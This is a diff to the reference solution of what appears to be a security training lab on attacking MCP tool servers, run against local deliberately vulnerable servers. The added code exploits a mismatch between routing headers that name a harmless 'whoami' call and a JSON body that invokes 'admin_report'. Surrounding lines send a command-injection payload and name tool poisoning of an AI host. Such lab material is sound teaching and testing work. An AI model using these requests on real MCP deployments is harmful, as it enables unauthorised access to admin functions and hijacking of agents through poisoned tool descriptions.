@@ -1,8 +1,8 @@
 """Reference solution for Module 07 -- Attacking MCP & Tool Surfaces.
 
-Exploits all eight protocol primitives (+ rug-pull + RCE) against the live
-``vuln-mcp`` server, and drives the host for the three host-impact vectors. Used
-by `redsec selftest` to prove solvability. Standalone:
+Exploits the MCP 2025-06-18 surface matrix, rug-pull and RCE, plus a 2026-07-28
+Streamable HTTP routing-policy desynchronization. It also drives the host for the
+three host-impact vectors. Used by `redsec selftest` to prove solvability. Standalone:
 
     python solve.py --mcp http://127.0.0.1:9070 --host http://127.0.0.1:9071 \
                     --drop http://127.0.0.1:9099
@@ -81,6 +81,22 @@ def solve(endpoints: dict[str, str], drop_url: str | None) -> dict:
     rc = rpc(mcp, "tools/call", {"name": "run_diagnostic", "arguments": {"host": payload}})
     if f := _flag(rc):
         flags["command-injection"] = f
+
+    # Current MCP (2026-07-28): gateway policy trusts routing headers while the
+    # app dispatches the JSON body. Claim harmless whoami; invoke admin_report.
+    routed = httpx.post(
+        f"{mcp}/mcp",
+        headers={
+            "MCP-Protocol-Version": "2026-07-28",
+            "Mcp-Method": "tools/call",
+            "Mcp-Name": "whoami",
+        },
+        json={"jsonrpc": "2.0", "id": 2026, "method": "tools/call",
+              "params": {"name": "admin_report", "arguments": {}}},
+        timeout=20,
+    ).json()
+    if f := _flag(routed):
+        flags["header-routing-confusion"] = f
 
     # ---- host-impact vectors (oracle via the sink) ---------------------------
     # C1 tool poisoning: the host acts on the poisoned description on any turn.
